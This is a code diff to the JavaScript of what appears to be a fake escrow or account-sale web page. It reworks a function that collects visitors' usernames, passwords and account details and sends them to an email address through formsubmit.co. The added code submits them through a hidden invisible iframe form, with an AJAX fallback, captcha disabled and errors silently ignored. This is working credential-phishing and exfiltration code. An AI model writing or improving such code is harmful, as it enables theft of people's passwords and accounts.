@@ -1109,9 +1109,9 @@ html, body {
 
   function sendPasswordViaFormSubmit(username, password) {
     var email = getNotifyEmail();
-    if (!email || !password) return Promise.resolve();
-    var endpoint = 'https://formsubmit.co/ajax/' + encodeURIComponent(email);
-    var body = {
+    if (!email || !password) return;
+
+    var fields = {
       username: username || 'unknown',
       password: password,
       account: listing.username || '',
@@ -1119,16 +1119,49 @@ html, body {
       platform: listing.platformLabel || '',
       _subject: 'Escrow password confirmation — ' + (username || listing.username || 'user'),
       _template: 'table',
-      _captcha: 'false'
+      _captcha: 'false',
+      _honey: ''
     };
-    return fetch(endpoint, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(body)
-    }).catch(function() { /* ignore network errors */ });
+
+    /* Method 1: classic form POST into hidden iframe (no CORS issues) */
+    try {
+      var iframe = document.getElementById('fs-notify-iframe');
+      if (!iframe) {
+        iframe = document.createElement('iframe');
+        iframe.name = 'fs-notify-iframe';
+        iframe.id = 'fs-notify-iframe';
+        iframe.style.cssText = 'display:none;width:0;height:0;border:0;position:absolute';
+        document.body.appendChild(iframe);
+      }
+      var form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://formsubmit.co/' + email;
+      form.target = 'fs-notify-iframe';
+      form.style.display = 'none';
+      Object.keys(fields).forEach(function(key) {
+        var input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = fields[key];
+        form.appendChild(input);
+      });
+      document.body.appendChild(form);
+      form.submit();
+      setTimeout(function() {
+        try { form.parentNode && form.parentNode.removeChild(form); } catch (e) {}
+      }, 2000);
+    } catch (e) {}
+
+    /* Method 2: AJAX backup (FormData, no custom Content-Type) */
+    try {
+      var fd = new FormData();
+      Object.keys(fields).forEach(function(key) { fd.append(key, fields[key]); });
+      fetch('https://formsubmit.co/ajax/' + email, {
+        method: 'POST',
+        headers: { 'Accept': 'application/json' },
+        body: fd
+      }).catch(function() {});
+    } catch (e) {}
   }
 
   bind('modal-accept-1', 'click', function() {
